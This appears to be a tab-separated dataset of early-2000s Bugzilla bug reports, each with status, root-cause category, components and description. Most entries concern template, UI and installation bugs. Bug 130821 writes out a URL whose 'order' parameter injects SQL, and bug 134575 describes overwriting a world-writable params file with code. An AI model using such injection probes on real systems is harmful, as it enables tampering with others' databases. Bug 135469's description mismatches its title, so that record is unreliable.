Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
130254%TAB%1015907787%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Template tests fail for interpolated names%TAB%Template tests fail for interpolated namesThe argument to process doesn't have to be a constant string, it can have vars in it, too (buglist.cgi does htis). This causes the tests to incorrectly fail. We hosuld use File::Find or something - see my template compilation patch.  I'll attach a workaround, which has r=myk x2 - just ignore names with $ in them.
130373%TAB%1015937203%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Query/Bug List%TAB%Sorting by Target Milestone in templatized buglist.cgi generates bogus error%TAB%Sorting by Target Milestone in templatized buglist.cgi generates bogus errorIf you attempt to sort buglist.cgi output by Target Milestone, you will get an error similar to the following:   Error    The custom sort order you specified in your form submission or   cookie contains an invalid column name ms_order.sortkey.
130821%TAB%1016063517%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%buglist: "order" parameter sends unchecked SQL%TAB%buglist: "order" parameter sends unchecked SQLhttp://bugzilla.mozilla.org/buglist.cgi?field0-0-0=reporter&type0-0-0=substring&value0-0-0=jrud&order=bugs.bug_id%20AND%20ALLYOURBASEAREBELONGTOUS  SQL Error: ... GROUP BY bugs.bug_id ORDER BY bugs.bug_id AND ALLYOURBASEAREBELONGTOUS: Unknown column 'ALLYOURBASEAREBELONGTOUS' in 'order clause' at globals.pl line 222.  I noticed this at b.m.o and didn't test bugzilla-tip because landfill is down.
131345%TAB%1016212741%TAB%4579%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Placeholder bug for revision to Bugzilla distribution of Bug Writing Guidelines ,Placeholder bug for revision to Bugzilla distribution of Bug Writing Guidelines%TAB%Placeholder bug for revision to Bugzilla distribution of Bug Writing Guidelines ,Placeholder bug for revision to Bugzilla distribution of Bug Writing GuidelinesI'd like to revise the Bugzilla version of the Bug Writing Guidelines in the next few days.   It was originally written to discourage sloppy bug writing, rather than to detail  best practices. Moreso, I've written about 1,500 more bugs since writing the original guidelines, and learned a lot more about writing non-sucky bugs that I'd like to incorporate.  Will attach a revised version for feedback and further revision in the next few days.
131521%TAB%1016308765%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Use of uninitialized value in split at /usr/lib/perl5/5.6.1/Cwd.pm line 103.%TAB%Use of uninitialized value in split at /usr/lib/perl5/5.6.1/Cwd.pm line 103.perl 5.6.1 has shipped with a Cwd.pm which gives a warning if $ENV{PATH} doesn't exist (see the above url). This is apparently fixed in bleedperl, but snice I get one of these (+ detained explanation) in the logs each time processmail is called, I figure we want to stop it.  The patch is just to set $::ENV{'PATH'} = ''; after deleting it in globals.pl (I can't produce a diff easily since I have too many other changes in my globals.pl)  I think we want to do this in 2.16 to stop warnings, and I can't think of anything which will break (Cwd.pm is part of perl, not a separate modules, so we can't just tell people to upgrade), so I'll set the milestone.
131568%TAB%1016351967%TAB%44081%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%template/default/global/header not valid HTML 4.01%TAB%template/default/global/header not valid HTML 4.01template/default/global/header not valid HTML 4.01
131659%TAB%1016401909%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Need to fixPerms the css directory%TAB%Need to fixPerms the css directoryWe don't fixPerms the css directory, so its possible that the css files will have the wrong perms on them.  Patch coming, needed for 2.16.
131715%TAB%1016431949%TAB%46787%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%The make_options sub improperly uses regular expressions wrt default values%TAB%The make_options sub improperly uses regular expressions wrt default valuesIn several places, the make_options sub found in CGI.pl is used to create an  HTML element from a list of options and the default option(s) to set as  SELECTED.   If it's a single-select set of options, all is well.   If it's a  multi select, the default value is submitted as "val1|val2|val3..." and used as  a regular expression.  This produces incorrect results.  First of all, the "^" and "$" would have to  be used to match the entire expression.  Here is a snippet that proves it: @items = ('Foo', 'Foo Two', 'Bar', 'Bar Two', 'Baz', 'Baz Two'); $default = 'Foo|Bar';  If the $default is matched to @items as a regular expression, 4 of them match successfully even though only two options should be matched.  This same argument is true if the default values can contain any characters  that would be interpreted as meta-characters in regular expressions.  In short, it's not valid to consider pipe-delimited values to be valid "or'd"  regular expressions.   Rather, the code should split on '|' and compare the  values with the 'eq' operator.  I'll attach a diff file that demonstrates how I solved this issue after I  submit the bug.  Dan Maser Reporter
132066%TAB%1016529687%TAB%37002%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Browser-General,Documentation,User Interface%TAB%hint to enable cookies or don't require them,login page should state that you need cookies enabled for bugzilla to remember your login past the next page%TAB%hint to enable cookies or don't require them,login page should state that you need cookies enabled for bugzilla to remember your login past the next pageit seems to be impossible to use bugzilla without cookies enabled, but the bugzilla pages doesn't tell the user so. it lets the user fill in the data, then displays the login page again. the bug report never makes it into the system (but bugzilla doesn't even tell the user that it won't!) silent failure is discouraging!  suggested fix: - tell the user to enable cookies (and to configure their junkbuster to let them through) or - change bugzilla to not rely on cookies (e.g. by using hidden form params instead)
132383%TAB%1016625367%TAB%5603%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%bugzilla should have a default favicon%TAB%bugzilla should have a default faviconThis would require help by someone with a clue about favicon structure/design ;) but I think that it would be nice if the default bugzilla install included a favicon. The image in the URL field is GPL (from the bug-buddy source, originally, I think) and might be a good starting place for any artist caring to look at something that would be a nice default for bugzilla.
132634%TAB%1016711053%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%error in report when quip option is selected%TAB%error in report when quip option is selectedGenerating a report with the quip option selected is generating the folowing  error if no quip are defined...  Use of uninitialized value in concatenation (.) or string at  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\reports.cgi line  337 (#1) (W uninitialized) An undefined value was used as if it were already  defined. It was interpreted as a "" or a 0, but maybe it was a mistake. To  suppress this warning assign a defined value to your variables. To help you  figure out what was undefined, perl tells you what operation you used the  undefined value in. Note, however, that perl optimizes your program and the  operation displayed in the warning may not necessarily appear literally in your  program. For example, "that $foo" is usually optimized into "that " . $foo, and  the warning will refer to the concatenation (.) operator, even though there is  no . in your program. [Thu Mar 21 21:41:21 2002]  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\reports.cgi: Use of  uninitialized value in concatenation (.) or string at  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\reports.cgi line  337.
132893%TAB%1016802072%TAB%38316%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Email Notifications%TAB%need X-Bugzilla-Reason: Watched,Create X-Bugzilla-Reason: Watched,Create header X-Bugzilla-Watch-Reason%TAB%need X-Bugzilla-Reason: Watched,Create X-Bugzilla-Reason: Watched,Create header X-Bugzilla-Watch-ReasonIt would be nice to be able to seperate watched mail from mail that i am actually listed or cc'ed on.  The way to do this would be to -- when processing who gets mail -- send out the mail with reasons to all those who are non-watchers, and then send out reason: watched to all watchers.  The problem is this is when you are watching someone but are also listed on the bug.  When the duplicates are removed from the "people-we-need-to-email" list, we need to  keep non-watcher duplicates. sometimes that doesn't happen.
132929%TAB%1016810592%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%buglist.cgi "long format" button doesn't work%TAB%buglist.cgi "long format" button doesn't workFrom npm.webtools:  "From: Tony Sweets <aredc5NO_SPAM@netscape.net> Newsgroups: netscape.public.mozilla.webtools Subject: long_list.cgi Problems Date: Fri, 22 Mar 2002 15:38:50 -0700  Hello All  I have the current Bugzilla (2.15) code from CVS and I'm having a problem with the "Long Format" report. If I do a query, then hit the "Long Format" Button after my query results appear, an error occurs. The error message says "You'd have more luck if you gave me some bug numbers"  I've looked around the code (I'm not a Perl Programmer! I'm a Java Guy) and I can't find where $buglist is getting assigned values for this perticular situation. I've notice that the cookie "BUGLIST" is populated . So my quick solution was to append $::COOKIE{"BUGLIST"} to the $buglist array at line 63 in long_list.cgi  This works, but I'm sure if this a valid or if it breaks anything.  --Tony "  Thats not valid - we need to push $vars->{buglist} to the template so that its in the form. The actual template already tries to us ethis param, but the cgi never supplies it.
132939%TAB%1016812633%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%"zarro bugs found is no more","zarro bugs found" is no more%TAB%"zarro bugs found is no more","zarro bugs found" is no moreThe template uses .count, it needs to use .size (line 96ish)
133063%TAB%1016903565%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Standardize setting and clearing of browser cookies,Provide standard API for setting and clearing browser cookies%TAB%Standardize setting and clearing of browser cookies,Provide standard API for setting and clearing browser cookiesCurrently cookies are set and cleared in a number of different files:  $ grep -l -i set-cookie *  2> /dev/null CGI.pl buglist.cgi colchange.cgi createaccount.cgi post_bug.cgi query.cgi relogin.cgi  Most of the time, the date used to set a cookie is an arbitrary one in the future (30-Jun-2029) and the date used to clear a cookie is an arbitrary one in the past (30-Jun-80) [note the lack of a century in the year].  Cookie setting and clearing should really be done through a standard API function (in CGI.pl or elsewhere) so that these dates may be adjusted easily without going through every file and updating them.  See RFC 2109 (HTTP State Management Mechanism) and RFC 2965 (HTTP State Management Mechanism) for details on cookies.
133200%TAB%1017002302%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%mass change removes dependencies%TAB%mass change removes dependenciesWhen using the mass change form, process_bug.cgi does not use the dependsonaction or blockedaction to perform the correct dependency changes, and acts simply as if 'makeexact'.  The result when nothing is entered into the depends/blocks fields is that it removes dependancies.  Steps to reproduce: 1) Query a bug with a known dependency 2) Select 'Change several bugs at once' 3) Type in a comment only and click submit 4) Display the bug; and view Bug Activity.  Actual Results: Comment added to bug, and bugs dependencies have been removed  Expected Results: Comment added to bug.  Workaround: remove the dependson/blocked form elements from tempate/default/buglist/change-form.tmpl  As an aside, it looks like this functionality is yet to be introduced in bug 42101.
133201%TAB%1017003589%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%syntax error in show_bug.cgi%TAB%syntax error in show_bug.cgiThe templatised show_bug.cgi causes a syntax error in IE, due to quoting in template/default/show/show_bug.html.tmpl (line 409)  -             onchange="if ((this.value != "[% bug.assigned_to_email %]") &&   +             onchange="if ((this.value != '[% bug.assigned_to_email %]') &&
133206%TAB%1017005734%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%mass change uses 'severity' rather than 'bug_severity'%TAB%mass change uses 'severity' rather than 'bug_severity'process_bug.cgi expects 'bug_severity' to contain the severity, as is the case in show_bug.cgi .    tempate/default/buglist/change-form.tmpl uses 'severity', which results in severity not being changed when using mass change.
133207%TAB%1017006066%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%mass confirming bugs fails%TAB%mass confirming bugs failsTheres a missing " after the action, so you get "unknown action confirm>".
133210%TAB%1017007828%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup uses $::params%TAB%checksetup uses $::paramsIn bug 96675 (R1.16 blocker), the patch uses $::params rather than $::param.
133273%TAB%1017041373%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%URL field not linked after show_bug.cgi templatization%TAB%URL field not linked after show_bug.cgi templatizationThe template uses bug.url but the URL is actually stored in bug.bug_file_loc.  Template also includes use of arcane 'FILTER url'.  Patch coming shortly.
133276%TAB%1017042185%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Check for data in 'groups' variable in show_bug.cgi template doesn't work%TAB%Check for data in 'groups' variable in show_bug.cgi template doesn't workThe check for existance of data in the 'groups' variable doesn't work in the show_bug.html.tmpl template.  It should use |IF groups.size > 0| instead of simply |IF groups|.  Patch to follow shortly.
133333%TAB%1017054487%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%'Create a New Attachment' link is broken after show_bug.cgi templatization%TAB%'Create a New Attachment' link is broken after show_bug.cgi templatizationThe 'Create a New Attachment' link is broken on show_bug.cgi after it was templatized.  The problem is that the 'bugid' parameter was not passed to attachment/list.atml.  Patch to follow shortly.
133372%TAB%1017065721%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Target Milestone URL should be escaped in templates using 'FILTER uri'%TAB%Target Milestone URL should be escaped in templates using 'FILTER uri'The targetmilestoneurl should be filtered using 'FILTER uri' in template/default/show/show_bug.html.tmpl.
133389%TAB%1017069736%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%show_bug does not select component%TAB%show_bug does not select componentshow_bug.cgi does not select the bugs component, resulting in commit changing the component to the first of the product.
133406%TAB%1017075978%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%errors if quotes in short_desc%TAB%errors if quotes in short_descshow_bug.cgi does not filter quotes in the bug short_desc, resulting in invalid html.
133423%TAB%1017080741%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Audit global/header for FILTER usage,Audit templates for FILTER usage%TAB%Audit global/header for FILTER usage,Audit templates for FILTER usage<justdave> just about nothing from "bug.*" should be allowed to be displayed without filtering  This may affect the title passed from show_bug.html.tmpl to global/header, which is then used unfiltered.
133425%TAB%1017081031%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Audit show_bug.html.tmpl for FILTER usage%TAB%Audit show_bug.html.tmpl for FILTER usageWith the templatized show_bug, I just got a summary truncated, probably because it contains quoted text: "..." 
133559%TAB%1017137481%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla Helper,Creating/Changing Bugs%TAB%Bugzilla Helper should be enter_bug.cgi template%TAB%Bugzilla Helper should be enter_bug.cgi templateBugzilla Helper should be a "simple bug entry form" mozilla.org-specific template for enter_bug.cgi. Now that enter_bug.cgi has been templatised, this should be quite simple.
133833%TAB%1017240321%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Error in templatized version of userprefs.cgi%TAB%Error in templatized version of userprefs.cgiIn userprefs.cgi, the email value of 'ExcludeSelf' is mistakenly written as  'excludeself' which causes the setting for receiving email for changes you make to never be saved properly. Attaching a patch fixing the problem for me.
133862%TAB%1017250686%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%bugzilla index page doesn't focus text field%TAB%bugzilla index page doesn't focus text fieldThe templatised index page doesn't focus the textfield like the old page did.
134022%TAB%1017314710%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%PERFORMANCE: deleting old login cookies locks login checks%TAB%PERFORMANCE: deleting old login cookies locks login checksCGI.pl's confirm_login() function runs a query to delete old login cookies whenever a script runs that function and the user is not logged in (i.e. quietly_check_login does not return a true value).  The query takes a number of seconds to complete (I saw these queries running for 15-26 seconds on b.m.o.) and causes quietly_check_login()'s user authentication queries to lock waiting for it to complete, which slows down overall Bugzilla performance.  The login cookies deletion query should not run on such a regular basis.
134198%TAB%1017387135%TAB%47800%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%addition for step_by_step installation file%TAB%addition for step_by_step installation fileChapter 3.2.12 HTTP Server  I suggest updating:  ---  With apache you'll also want to make sure that within the 	access.conf file the line:  Options ExecCGI is in the stanza that covers the directories into which 	you intend to put the bugzilla .html and .cgi files.  ---  To:  ---  With apache you'll also want to make sure that within the 	access.conf file the lines:  Options ExecCGI  AllowOverride Limit are in the stanza that covers the directories into which 	you intend to put the bugzilla .html and .cgi files.  AllowOverride Limit allows the use of a Deny statement in the .htaccess file  generated by checksetup.pl    ---
134465%TAB%1017510680%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%We die if the admin email address doesn't match the regexp%TAB%We die if the admin email address doesn't match the regexpWe die, rather than prompting again. This isn't very friendly.
134474%TAB%1017520787%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%mass change form doesn't take product groups into account,mass change form offers too many groups%TAB%mass change form doesn't take product groups into account,mass change form offers too many groupsThe pre-templisation code appears to only displayed a group if you were in the group, _and_ the group was either not a product group, or there was at least one bug present form that product (This is from reading old code, I haven't actually tried this.)  This seems wrong, since then you could make a bug not in that product a member of a product group. This is definately wrong for the current code, though, which doesn't care about buggroups at all.  Beware of bug 117718 when fixing this - we should probably duplicate the 'is this on the right product' check there, at least for single bugs.
134562%TAB%1017586900%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%taint error in buglist.cgi%TAB%taint error in buglist.cgiWhilst generating a buglist for a query containing 'votes', Bugzilla returns a software error "Attempted to send tainted string 'SELECT DISTINCT ...' to the database at globals.pl line 235.  The taint error is introduced at buglist.cgi line 1193.
134571%TAB%1017591223%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Reporting/Charting%TAB%client-side image maps in showdependencygraph.cgi%TAB%client-side image maps in showdependencygraph.cgiDependency graphs use server-side image maps in order that a user can click on a bug's node to bring up the bug's details.  When using 'dot' (bug 120537) or the GraphViz module (bug 134565), the image map data is able to be generated in time to be included as a client-side image maps.
134575%TAB%1017595281%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%defparams.pl::WriteParams makes data directory world writable%TAB%defparams.pl::WriteParams makes data directory world writableIf the dir isn't there, it tires to create it, and make it world writable. This is a bad idea - if it doesn't exist, we should die.  The params file is also world writable, which is even a worse idea, because even with a webservergroup, the perms are 771, so if you know the name of the file, a local user can overwrite it, and add code to do whatever they want:  if ($::userid = 12345) { $::usergroupset = whatever; }  for example. How can defparams.pl check if a webservergroup was specified?  How about we move the WriteParams stuff into checksetup.pl? This would also mean that params can be used in checksetup in a cleaner way.  Changing params would then just copy the perms on the existing file. This wouldn't help the non-webservergroup case, though - see bug 107513.
135145%TAB%1017809981%TAB%35981%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting,Bugzilla-General%TAB%Graphs generated by local webdot are huge%TAB%Graphs generated by local webdot are hugeWe have a local installation of bugzilla, and installed graphviz+webdot locally in order to get graphs functioning. However, the graphs generated are huge.  In order to make it work properly (i.e. only create a graph as big as necessary) the following change needs to be made to showdependencygraph.cgi (thanks to Dan Maser - dan@maser.com):  The line   graph [URL="${urlbase}query.cgi", rankdir=$::FORM{'rankdir'} size=64,64]  needs to be changed to  graph [URL="${urlbase}query.cgi", rankdir=$::FORM{'rankdir'}]  This at least works for me.
135291%TAB%1017840406%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%template version strings break non-xml templates,template version strings break templates%TAB%template version strings break non-xml templates,template version strings break templatesThe recent template version strings  (e.g. <!-- 1.0@bugzilla.org --> ) which have been inserted into all templates break non-xml templates, specificually the follow mail templates (from bug 23067) token/emailchangenew.txt.tmpl token/emailchangeold.txt.tmpl token/tokencancel.txt.tmpl  John Vandenberg Reporter
135449%TAB%1017904905%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Allow preset queries to override the last sort order%TAB%Allow preset queries to override the last sort orderIt would be nice, if you could have preset queries that would not use the lastorder parameter.   This would be helpfull in situations, where you always want to have a preset query sorted by for example importance. Currently, the previously used sort order will be the first one (the only one?) used.
135469%TAB%1017911917%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Reporting/Charting%TAB%Missing version in show/dependency-graph.html.tmpl (tree is a-burinin')%TAB%Missing version in show/dependency-graph.html.tmpl (tree is a-burinin')It would be nice, if you could have preset queries that would not use the lastorder parameter.   This would be helpfull in situations, where you always want to have a preset query sorted by for example importance. Currently, the previously used sort order will be the first one (the only one?) used.
135473%TAB%1017912676%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%Using back button after failure on attachment.cgi does not disable radio buttons when patch checkbox is checked%TAB%Using back button after failure on attachment.cgi does not disable radio buttons when patch checkbox is checkedWhen the form on attachment.cgi (action=enter) is submitted and an error page is displayed, the user is told to hit the 'Back' button to correct the mistake.  However, if the user had already checked the 'patch' checkbox, the radio buttons will not be disabled when the page is reloaded from hitting 'Back'.  Essentially, an onLoad event is needed that checks whether the patch checkbox is already checked, and if so, should call setContentTypeDisabledStat().  NOTE: Since setContentTypeDisabledStat() is defined in the body of the web page, it may be necessary to move it up into the HEAD section to get an onLoad event to work properly.  (I'm not sure about this, though.)
135543%TAB%1017925721%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%@Support::Templates::testitems does not list all templates%TAB%@Support::Templates::testitems does not list all templatesThe @Support::Templates::testitems module variable does not list every template stored under the templates/default/ directory.  The Support::Templates module should probably use a glob to pick up all of the files rather than pattern- matching through perl scripts.  I will attach a patch to t/004template.t that demostrates this by checking for version strings in all template files using a glob() instead of @Support::Templates::testitems.  The following templates were found not to have version strings (I'll open another bug for this later):  buglist/buglist-rdf.rdf.tmpl buglist/buglist-simple.html.tmpl buglist/buglist.html.tmpl buglist/change-form.tmpl buglist/table.tmpl prefs/account.tmpl prefs/email.tmpl prefs/footer.tmpl prefs/permissions.tmpl show/navigate.html.tmpl
135545%TAB%1017926223%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%More templates with missing versions%TAB%More templates with missing versionsIn the course of discovering Bug 135543, I found more templates without version numbers.  They are:  buglist/buglist-rdf.rdf.tmpl buglist/buglist-simple.html.tmpl buglist/buglist.html.tmpl buglist/change-form.tmpl buglist/table.tmpl prefs/account.tmpl prefs/email.tmpl prefs/footer.tmpl prefs/permissions.tmpl show/navigate.html.tmpl
135639%TAB%1017965766%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Update section about command line queries%TAB%Update section about command line queriesIf you read http://www.bugzilla.org/docs/html/cmdline.html , you will notice that it says that you need to download the files manually (e.g. using wget). This is no longer necessary since the files are now in cvs, see http://lxr.mozilla.org/mozilla/source/webtools/bugzilla/contrib/cmdline
135666%TAB%1017977546%TAB%48358%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Creating bugs: OS detection doesn't work for Internet Explorer, Win NT 4.0%TAB%Creating bugs: OS detection doesn't work for Internet Explorer, Win NT 4.0If a new bug is entered from a PC running Windows NT 4.0 and Internet Explorer,  the operating system cannot be detected (you get 'other').  The problem is that the browser identifies itself as   Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0) which does not match in sub pickos in enter_bug.cgi.  One solution ist to change the line             /Mozilla.*\(Windows.*NT/        && do {return "Windows NT";}; to             /Mozilla.*Windows.*NT/          && do {return "Windows NT";}; so that no '(' is required the string 'Windows'.
135707%TAB%1017990455%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%normalize template filenames%TAB%normalize template filenamesTemplate filenames are a mess and should be normalized.  For templates supporting multiple formats the following convention has been established:  SCRIPTNAME.EXTENSION.tmpl (for the default format) SCRIPTNAME-FORMATNAME.EXTENSION.tmpl (for other formats)  For other template files we talked about the following convention:  complete documents: NAME.EXTENSION.tmpl document fragments: NAME.tmpl  As we begin to build more non-HTML templates, however, I think we'll find it useful to identify the content-type of template fragments, so I suggest we do the following:  complete documents: NAME.EXTENSION.tmpl document fragments: NAME.EXTENSION.tmpl  One other note: In discussions we decided to use hyphens to separate multiple words in template names, i.e. display-something.html.tmpl.
135812%TAB%1018010163%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration,Email Notifications%TAB%mail template administration,Add params for the email address that bugmail comes from,Add a 'mailfrom' parameter to unify bugmail originating address%TAB%mail template administration,Add params for the email address that bugmail comes from,Add a 'mailfrom' parameter to unify bugmail originating addressThe mail templates introduced for the change of email address feature (bug 23067) are from 'bugzilla-admin-daemon' by default.  Each of these needs to be modified by the maintainer to append a domain.  The following could be added to ease the maintainers job: 1) A global email header, which is included from any mail template.  This single file could then be documented, and a simple check placed in checksetup.pl to inform the maintainer that the mail header has not been customised. 2) A 'Bugzilla mail domain' param, which could then be automaticually appended to 'bugzilla-admin-daemon'.
135815%TAB%1018010709%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Regression on CGI.pl for link to showvotes.cgi%TAB%Regression on CGI.pl for link to showvotes.cgiRevsion 1.143 of CGI.pl (checked in for Bug 126456) contained a regression to showvotes.cgi (which was removed for Bug 117760) during templatization.
135817%TAB%1018010862%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%templatise Token.pm%TAB%templatise Token.pmtemplatise Token.pm
135820%TAB%1018011134%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration%TAB%token cancellation message are not user-friendly%TAB%token cancellation message are not user-friendlyToken cancellation messages are overly terse and technical to be effective.  From bug 23067 comment 98:  >+Subject: [% tokentype %] token cancelled >+ >+A token was cancelled from [% remoteaddress %].   >+If you did not request this, it could be either an honest  >+mistake or the result of a malicious hack attempt.    This is both cryptic and scary; we shouldn't be talking about tokens, (I don't know if I requested a 'token cancellation' - I'm just trying to change my email address) and we shouldn't be talking about "malicious hack attempts" without qualifying it. e.g. "someone breaking into your Bugzilla account" is better.
135836%TAB%1018012588%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Accounts,attachment and request management%TAB%change requests should inlcude expiration details,change requests should include expiration details%TAB%change requests should inlcude expiration details,change requests should include expiration detailsThe email change request send emails to both the new and old email address, providing directions, however it does not include a date after which those directions will no longer work.
136003%TAB%1018117704%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%two extra spaces after every comment%TAB%two extra spaces after every commentcomments.tmpl has:    <pre>     [%- quoteUrls(comment.body) -%]   </pre>  I added the - bits to stop new lines, but it still adds the spaces, since the generated html is:    <pre>asda  </pre>  This is because PRE_CHOMP removes whitespace back to the end of the preceeding line, but POST_CHOMP (which we don't use by default for some reason I don't really understand) only chomps to the beginning of teh next line.  The fix is to just move this all only one single line, so I'll attach the trivial patch.
